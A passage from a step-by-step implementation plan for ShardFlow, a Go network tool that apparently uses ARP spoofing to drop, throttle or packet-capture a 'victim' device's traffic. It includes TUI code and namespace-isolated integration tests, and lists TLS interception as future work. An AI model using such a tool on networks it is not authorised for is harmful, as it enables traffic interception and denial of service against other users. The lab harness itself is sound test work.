// (a v1 limitation; an in-TUI input prompt is deferred).
func Run(sockPath string, defaultRateKbit int, defaultPcapDir string) error {
	c, err := rpc.Dial(sockPath)
	if err != nil {
		return fmt.Errorf("dial daemon: %w", err)
	}
	defer c.Close()

	p := tea.NewProgram(newModel(c, defaultRateKbit, defaultPcapDir), tea.WithAltScreen())

	// Event subscription is driven by a tea.Cmd loop (see waitForEventCmd
	// in keys.go); no hand-rolled goroutine is ever calling p.Send, so
	// there's no pre-Run race. Initial Devices.List + Policy.List come
	// from the same Init() Cmd batch.

	_, err = p.Run()
	return err
}

// loadDevicesNow performs a synchronous Devices.List + Policy.List and
// returns the devicesLoadedMsg the program should consume. Each row's
// `policy` field reflects the current daemon-side policy.
func loadDevicesNow(c *rpc.Client) tea.Msg {
	var devs []rpc.DeviceDTO
	if err := c.Call(context.Background(), rpc.MethodDevicesList, nil, &devs); err != nil {
		return eventMsg{text: "load devices: " + err.Error()}
	}
	var policies []rpc.PolicyEntryDTO
	if err := c.Call(context.Background(), rpc.MethodPolicyList, nil, &policies); err != nil {
		policies = nil // non-fatal: device list still renders, policy column blank
	}
	policyByMAC := make(map[string]rpc.PolicyEntryDTO, len(policies))
	for _, p := range policies {
		policyByMAC[p.MAC] = p
	}
	rows := make([]deviceRow, 0, len(devs))
	for _, d := range devs {
		row := deviceRow{ip: d.IP, mac: d.MAC, hostname: d.Hostname, vendor: d.Vendor}
		if p, ok := policyByMAC[d.MAC]; ok {
			row.policy = summarisePolicy(p)
		}
		rows = append(rows, row)
	}
	return devicesLoadedMsg{rows: rows}
}

func summarisePolicy(p rpc.PolicyEntryDTO) string {
	switch p.Kind {
	case "drop":
		return "drop"
	case "throttle":
		return fmt.Sprintf("throttle %dkbit", p.RateKbit)
	case "pcap":
		return "pcap"
	}
	return "?"
}

func refreshDevicesCmd(c *rpc.Client) tea.Cmd {
	return func() tea.Msg { return loadDevicesNow(c) }
}

// waitForEventCmd blocks on the next server-pushed event and returns it as
// an eventMsg. The Update handler re-issues this Cmd to receive the
// following event — the tea.Cmd-loop pattern recommended by charmbracelet
// for streaming subscriptions. On a closed event channel (daemon
// disconnect) it returns a distinct disconnectedMsg so Update knows NOT
// to re-subscribe, avoiding a tight spin loop.
func waitForEventCmd(c *rpc.Client) tea.Cmd {
	return func() tea.Msg {
		ev, ok := <-c.Events()
		if !ok {
			return disconnectedMsg{}
		}
		refresh := ev.Method == rpc.EventDeviceDiscovered || ev.Method == rpc.EventDeviceUpdated
		return eventMsg{text: ev.Method + " " + string(ev.Params), refreshDevices: refresh}
	}
}

func applyPolicyCmd(c *rpc.Client, target string, key rune, defaultRateKbit int, defaultPcapDir string) tea.Cmd {
	return func() tea.Msg {
		spec := rpc.PolicySpec{Target: target}
		switch key {
		case 'd':
			spec.Kind = rpc.PolicyDrop
		case 't':
			spec.Kind = rpc.PolicyThrottle
			spec.RateKbit = defaultRateKbit
		case 'p':
			spec.Kind = rpc.PolicyPcap
			spec.PcapDir = defaultPcapDir
		case 'x':
			var r map[string]string
			if err := c.Call(context.Background(), rpc.MethodPolicyClear, map[string]string{"target": target}, &r); err != nil {
				return eventMsg{text: fmt.Sprintf("clear %s: %s", target, err)}
			}
			return eventMsg{text: "cleared " + target, refreshDevices: true}
		}
		var r map[string]string
		if err := c.Call(context.Background(), rpc.MethodPolicySet, spec, &r); err != nil {
			return eventMsg{text: fmt.Sprintf("policy %s %s: %s", target, spec.Kind, err)}
		}
		return eventMsg{text: fmt.Sprintf("policy %s → %s", target, spec.Kind), refreshDevices: true}
	}
}

func scanCmd(c *rpc.Client) tea.Cmd {
	return func() tea.Msg {
		var r map[string]string
		_ = c.Call(context.Background(), rpc.MethodScan, nil, &r)
		return eventMsg{text: "scan triggered"}
	}
}
```

- [ ] **Step 5: Run TUI tests, confirm pass**

```bash
go test ./internal/tui/...
```

Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add internal/tui/ go.mod go.sum
git commit -m "feat(tui): bubbletea dashboard with device list, policy panel, event log"
```

---

### Task 6.4: `cmd/shardflow` — wire CLI/TUI into the client binary

**Files:**
- Modify: `cmd/shardflow/main.go`

- [ ] **Step 1: Replace the stub**

```go
package main

import (
	"fmt"
	"os"

	"github.com/hett-patell/ShardFlow/internal/cli"
)

func main() {
	if err := cli.NewRoot().Execute(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
```

- [ ] **Step 2: Build**

```bash
go build ./cmd/shardflow/...
```

Expected: clean build.

- [ ] **Step 3: Smoke test the help output**

```bash
./bin/shardflow --help
```

Expected: lists `scan`, `devices`, `policy`, `stats`, `tui`.

- [ ] **Step 4: Commit**

```bash
git add cmd/shardflow/
git commit -m "feat(shardflow): wire CLI root into client binary"
```

---

## Phase 7: Integration tests via Linux network namespaces

The harness builds a triangle of namespaces: `lab-gw` (gateway), `lab-vic` (victim), `lab-op` (operator running `shardflowd`). All three connect via a Linux bridge inside a fourth `lab-bridge` ns. Tests run as root and are gated by `-tags=integration`.

### Task 7.1: netns harness — setup, teardown, helpers

**Files:**
- Create: `test/netns/harness.go`
- Create: `test/netns/setup.sh`
- Create: `test/netns/teardown.sh`
- Create: `test/netns/harness_test.go`

- [ ] **Step 1: Create the setup script**

In `test/netns/setup.sh`:

```sh
#!/usr/bin/env bash
# Build the lab-gw / lab-vic / lab-op netns topology connected by a bridge.
# Idempotent: re-running tears down first.
set -euo pipefail

NS=(lab-gw lab-vic lab-op)
BR_NS=lab-bridge
BR=lab-br0

cleanup() {
  for n in "${NS[@]}" "$BR_NS"; do
    ip netns del "$n" 2>/dev/null || true
  done
  ip link del lab-veth-gw 2>/dev/null || true
  ip link del lab-veth-vic 2>/dev/null || true
  ip link del lab-veth-op 2>/dev/null || true
}
cleanup

ip netns add "$BR_NS"
ip -n "$BR_NS" link add "$BR" type bridge
ip -n "$BR_NS" link set "$BR" up

create_node() {
  local name=$1 ip=$2 veth_outer=$3 veth_inner=$4
  ip netns add "$name"
  ip link add "$veth_outer" type veth peer name "$veth_inner"
  ip link set "$veth_inner" netns "$name"
  ip link set "$veth_outer" netns "$BR_NS"
  ip -n "$BR_NS" link set "$veth_outer" master "$BR"
  ip -n "$BR_NS" link set "$veth_outer" up
  ip -n "$name" addr add "$ip"/24 dev "$veth_inner"
  ip -n "$name" link set lo up
  ip -n "$name" link set "$veth_inner" up
}

create_node lab-gw  10.0.99.1  lab-veth-gw  eth0
create_node lab-vic 10.0.99.42 lab-veth-vic eth0
create_node lab-op  10.0.99.5  lab-veth-op  eth0

# victim's default route via the gateway
ip -n lab-vic route add default via 10.0.99.1
# operator also needs a default route or shardflowd's gateway-resolution refuses to start
ip -n lab-op route add default via 10.0.99.1

echo "lab namespaces ready: gw=10.0.99.1 vic=10.0.99.42 op=10.0.99.5"
```

- [ ] **Step 2: Create teardown script**

In `test/netns/teardown.sh`:

```sh
#!/usr/bin/env bash
set -euo pipefail
for n in lab-gw lab-vic lab-op lab-bridge; do
  ip netns del "$n" 2>/dev/null || true
done
ip link del lab-veth-gw 2>/dev/null || true
ip link del lab-veth-vic 2>/dev/null || true
ip link del lab-veth-op 2>/dev/null || true
echo "lab namespaces removed"
```

- [ ] **Step 3: Make scripts executable**

```bash
chmod +x test/netns/setup.sh test/netns/teardown.sh
```

- [ ] **Step 4: Write the Go harness wrapper**

In `test/netns/harness.go`:

```go
//go:build integration
// +build integration

// Package netns provides setup/teardown helpers for the integration test
// triangle (lab-gw, lab-vic, lab-op).
package netns

import (
	"os/exec"
	"path/filepath"
	"runtime"
)

// Setup runs setup.sh; must be invoked as root.
func Setup() error {
	_, file, _, _ := runtime.Caller(0)
	return exec.Command(filepath.Join(filepath.Dir(file), "setup.sh")).Run()
}

// Teardown runs teardown.sh.
func Teardown() error {
	_, file, _, _ := runtime.Caller(0)
	return exec.Command(filepath.Join(filepath.Dir(file), "teardown.sh")).Run()
}

// InNS runs a command inside the named netns and returns its combined output.
func InNS(ns string, name string, args ...string) ([]byte, error) {
	full := append([]string{"netns", "exec", ns, name}, args...)
	return exec.Command("ip", full...).CombinedOutput()
}
```

- [ ] **Step 5: Smoke-test the harness**

In `test/netns/harness_test.go`:

```go
//go:build integration
// +build integration

package netns

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestSetupAndPing(t *testing.T) {
	require.NoError(t, Setup())
	t.Cleanup(func() { _ = Teardown() })

	out, err := InNS("lab-vic", "ping", "-c", "1", "-W", "1", "10.0.99.1")
	require.NoError(t, err, string(out))
	require.True(t, strings.Contains(string(out), "1 received"))
}
```

- [ ] **Step 6: Run as root**

```bash
sudo go test -tags=integration -run TestSetupAndPing ./test/netns/...
```

Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add test/netns/
git commit -m "test(netns): integration test harness with lab-gw/vic/op topology"
```

---

### Task 7.2: Integration test — drop policy

**Files:**
- Create: `test/integration/drop_test.go`

End-to-end: bring up the harness, run shardflowd in `lab-op`, scan, apply drop policy to `lab-vic`, assert ping fails.

- [ ] **Step 1: Write the test**

In `test/integration/drop_test.go`:

```go
//go:build integration
// +build integration

package integration

import (
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/hett-patell/ShardFlow/test/netns"
)

func TestDropPolicyBlocksPing(t *testing.T) {
	require.NoError(t, netns.Setup())
	t.Cleanup(func() { _ = netns.Teardown() })

	// Start shardflowd inside lab-op. Build the binary first.
	require.NoError(t, exec.Command("go", "build", "-o", "/tmp/shardflowd", "./cmd/shardflowd").Run())
	daemon := exec.Command("ip", "netns", "exec", "lab-op",
		"/tmp/shardflowd", "-i", "eth0", "-sock", "/tmp/sf.sock", "--force", "--clean-on-start")
	require.NoError(t, daemon.Start())
	t.Cleanup(func() { _ = daemon.Process.Kill() })

	// Wait for the socket to appear inside lab-op. `test -S` exits 0 when
	// the path is a socket; check the error rather than the (always empty)
	// output.
	socketReady := false
	for i := 0; i < 50; i++ {
		if _, err := netns.InNS("lab-op", "test", "-S", "/tmp/sf.sock"); err == nil {
			socketReady = true
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	require.True(t, socketReady, "daemon socket /tmp/sf.sock did not appear")

	// Scan from inside lab-op via the client.
	require.NoError(t, exec.Command("go", "build", "-o", "/tmp/shardflow", "./cmd/shardflow").Run())
	scan, err := netns.InNS("lab-op", "/tmp/shardflow", "--sock", "/tmp/sf.sock", "scan")
	require.NoError(t, err, string(scan))

	// Wait for the victim to be observed.
	for i := 0; i < 50; i++ {
		out, _ := netns.InNS("lab-op", "/tmp/shardflow", "--sock", "/tmp/sf.sock", "devices", "list", "--json")
		if strings.Contains(string(out), "10.0.99.42") {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}

	// Apply drop policy.
	out, err := netns.InNS("lab-op", "/tmp/shardflow", "--sock", "/tmp/sf.sock", "policy", "set", "10.0.99.42", "drop")
	require.NoError(t, err, string(out))

	// Give ARP cache time to flip.
	time.Sleep(2 * time.Second)

	// Ping from victim → gateway should now fail.
	pingOut, _ := netns.InNS("lab-vic", "ping", "-c", "1", "-W", "2", "10.0.99.1")
	require.False(t, strings.Contains(string(pingOut), "1 received"),
		"expected ping to fail under drop policy, got: %s", string(pingOut))

	// Cleanup: clear policy and verify ping recovers.
	out, err = netns.InNS("lab-op", "/tmp/shardflow", "--sock", "/tmp/sf.sock", "policy", "clear", "10.0.99.42")
	require.NoError(t, err, string(out))
	time.Sleep(2 * time.Second)
	pingOut, err = netns.InNS("lab-vic", "ping", "-c", "1", "-W", "2", "10.0.99.1")
	require.NoError(t, err, string(pingOut))
	require.True(t, strings.Contains(string(pingOut), "1 received"))
}
```

- [ ] **Step 2: Run as root**

```bash
sudo go test -tags=integration -v -run TestDropPolicyBlocksPing ./test/integration/...
```

Expected: PASS.

- [ ] **Step 3: Commit**

```bash
git add test/integration/
git commit -m "test(integration): drop policy blocks victim ↔ gateway ping"
```

---

### Task 7.3: Integration test — throttle policy

**Files:**
- Create: `test/integration/throttle_test.go`

Apply throttle 200 kbit; measure that bulk transfer between vic and gw drops below ~250 kbit/s.

- [ ] **Step 1: Write the test**

In `test/integration/throttle_test.go`:

```go
//go:build integration
// +build integration

package integration

import (
	"encoding/json"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/hett-patell/ShardFlow/test/netns"
)

func TestThrottlePolicyLimitsBandwidth(t *testing.T) {
	startDaemon(t)
	scanAndAwaitVictim(t)

	out, err := netns.InNS("lab-op", "/tmp/shardflow", "--sock", "/tmp/sf.sock",
		"policy", "set", "10.0.99.42", "throttle", "200kbit")
	require.NoError(t, err, string(out))

	time.Sleep(2 * time.Second)

	// Run iperf3 server in gw, client in vic, capture bps.
	go func() { _, _ = netns.InNS("lab-gw", "iperf3", "-s", "-1") }()
	time.Sleep(500 * time.Millisecond)
	out, err = netns.InNS("lab-vic", "iperf3", "-c", "10.0.99.1", "-t", "3", "-J")
	require.NoError(t, err, string(out))

	// Parse iperf3 JSON and assert sender bps is below the throttle cap (200kbit
	// nominal; allow 50% headroom to absorb burst).
	var report struct {
		End struct {
			SumSent struct {
				BitsPerSecond float64 `json:"bits_per_second"`
			} `json:"sum_sent"`
		} `json:"end"`
	}
	require.NoError(t, json.Unmarshal(out, &report), "iperf3 json parse: %s", out)
	require.Less(t, report.End.SumSent.BitsPerSecond, float64(300_000),
		"throttle did not limit bandwidth: %v bps", report.End.SumSent.BitsPerSecond)
}
```

**Step 1.5: Add the shared helpers used by tasks 7.3 and 7.4.**

In `test/integration/helpers_test.go`:

```go
//go:build integration
// +build integration

package integration

import (
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/hett-patell/ShardFlow/test/netns"
)

func startDaemon(t *testing.T) {
	t.Helper()
	require.NoError(t, netns.Setup())
	t.Cleanup(func() { _ = netns.Teardown() })

	require.NoError(t, exec.Command("go", "build", "-o", "/tmp/shardflowd", "./cmd/shardflowd").Run())
	require.NoError(t, exec.Command("go", "build", "-o", "/tmp/shardflow", "./cmd/shardflow").Run())

	daemon := exec.Command("ip", "netns", "exec", "lab-op",
		"/tmp/shardflowd", "-i", "eth0", "-sock", "/tmp/sf.sock", "--force", "--clean-on-start")
	require.NoError(t, daemon.Start())
	t.Cleanup(func() { _ = daemon.Process.Kill() })

	for i := 0; i < 50; i++ {
		if _, err := netns.InNS("lab-op", "test", "-S", "/tmp/sf.sock"); err == nil {
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
	t.Fatal("daemon socket /tmp/sf.sock did not appear")
}

func scanAndAwaitVictim(t *testing.T) {
	t.Helper()
	scan, err := netns.InNS("lab-op", "/tmp/shardflow", "--sock", "/tmp/sf.sock", "scan")
	require.NoError(t, err, string(scan))
	for i := 0; i < 50; i++ {
		out, _ := netns.InNS("lab-op", "/tmp/shardflow", "--sock", "/tmp/sf.sock",
			"devices", "list", "--json")
		if strings.Contains(string(out), "10.0.99.42") {
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
	t.Fatal("victim 10.0.99.42 not observed within timeout")
}
```

(Note: `drop_test.go` from Task 7.2 has the same daemon-startup block inline. After this step, `drop_test.go` should be refactored to call `startDaemon(t)` and `scanAndAwaitVictim(t)` like the throttle/pcap tests do. Remove the inline blocks.)

- [ ] **Step 2: Run as root**

```bash
sudo go test -tags=integration -v -run TestThrottlePolicyLimitsBandwidth ./test/integration/...
```

Expected: PASS (requires `iperf3` installed in the host system).

- [ ] **Step 3: Commit**

```bash
git add test/integration/
git commit -m "test(integration): throttle policy limits victim bandwidth"
```

---

### Task 7.4: Integration test — pcap policy

**Files:**
- Create: `test/integration/pcap_test.go`

Apply pcap policy; generate a few pings; assert a non-empty `.pcap` file appeared.

- [ ] **Step 1: Write the test**

In `test/integration/pcap_test.go`:

```go
//go:build integration
// +build integration

package integration

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/hett-patell/ShardFlow/test/netns"
)

func TestPcapPolicyWritesFile(t *testing.T) {
	startDaemon(t)
	scanAndAwaitVictim(t)

	pcapDir := t.TempDir()
	out, err := netns.InNS("lab-op", "/tmp/shardflow", "--sock", "/tmp/sf.sock",
		"policy", "set", "10.0.99.42", "pcap", pcapDir)
	require.NoError(t, err, string(out))

	// Generate traffic.
	for i := 0; i < 5; i++ {
		_, _ = netns.InNS("lab-vic", "ping", "-c", "1", "10.0.99.1")
		time.Sleep(200 * time.Millisecond)
	}

	// Find a non-empty pcap-ng file under pcapDir.
	entries, err := os.ReadDir(pcapDir)
	require.NoError(t, err)
	var found bool
	for _, e := range entries {
		if !strings.HasSuffix(e.Name(), ".pcapng") {
			continue
		}
		fi, err := os.Stat(filepath.Join(pcapDir, e.Name()))
		require.NoError(t, err)
		// pcap-ng SHB is 28 bytes; expect at least one Enhanced Packet Block
		// after it for the file to be "non-empty".
		if fi.Size() > 28 {
			found = true
			break
		}
	}
	require.True(t, found, "expected at least one non-empty .pcapng in %s", pcapDir)
}
```

- [ ] **Step 2: Run as root, confirm pass**

```bash
sudo go test -tags=integration -v -run TestPcapPolicyWritesFile ./test/integration/...
```

- [ ] **Step 3: Commit**

```bash
git add test/integration/
git commit -m "test(integration): pcap policy writes capture files"
```

---

### Task 7.5: Integration test — recovery refuses orphaned state

**Files:**
- Create: `test/integration/recovery_test.go`

Pre-create the `inet shardflow` nft table in `lab-op`. Start `shardflowd` without `--clean-on-start`; assert it refuses. Restart with `--clean-on-start`; assert it succeeds.

- [ ] **Step 1: Write the test**

In `test/integration/recovery_test.go`:

```go
//go:build integration
// +build integration

package integration

import (
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/hett-patell/ShardFlow/test/netns"
)

func TestRecoveryRefusesOrphanedNFTTable(t *testing.T) {
	require.NoError(t, netns.Setup())
	t.Cleanup(func() { _ = netns.Teardown() })

	// Plant the orphaned table.
	_, err := netns.InNS("lab-op", "nft", "add", "table", "inet", "shardflow")
	require.NoError(t, err)

	require.NoError(t, exec.Command("go", "build", "-o", "/tmp/shardflowd", "./cmd/shardflowd").Run())

	// Without --clean-on-start: should fail fast.
	cmd := exec.Command("ip", "netns", "exec", "lab-op",
		"/tmp/shardflowd", "-i", "eth0", "-sock", "/tmp/sf.sock", "--force")
	out, err := cmd.CombinedOutput()
	require.Error(t, err)
	require.True(t, strings.Contains(string(out), "orphaned"), "expected refusal message, got: %s", out)

	// With --clean-on-start: should start, then we kill it.
	cmd = exec.Command("ip", "netns", "exec", "lab-op",
		"/tmp/shardflowd", "-i", "eth0", "-sock", "/tmp/sf.sock", "--force", "--clean-on-start")
	require.NoError(t, cmd.Start())
	t.Cleanup(func() { _ = cmd.Process.Kill() })
	time.Sleep(1 * time.Second)
	require.True(t, cmd.ProcessState == nil || !cmd.ProcessState.Exited(),
		"expected daemon to be running with --clean-on-start")
}
```

- [ ] **Step 2: Run as root, confirm pass**

```bash
sudo go test -tags=integration -v -run TestRecoveryRefusesOrphanedNFTTable ./test/integration/...
```

- [ ] **Step 3: Run the full integration suite end-to-end**

```bash
sudo go test -tags=integration -v ./test/...
```

Expected: every test in `test/integration/` and `test/netns/` passes.

- [ ] **Step 4: Commit**

```bash
git add test/integration/recovery_test.go
git commit -m "test(integration): recovery refuses orphaned nft table without --clean-on-start"
```

---

## Done

After all phases, the repository should:
- Build clean with `make build`.
- Pass `make test` (unit tests, no root needed).
- Pass `sudo make test-int` on a Linux host (integration tests, root + iperf3 required).
- Produce two binaries: `bin/shardflow` and `bin/shardflowd`.
- Match the design doc end-to-end.

Future stretch (out of scope for this plan; deferred per spec §3): TLS interception (new sub-spec), HTTP rewrite (new sub-spec), IPv6/NDP, scripting hooks, web UI.

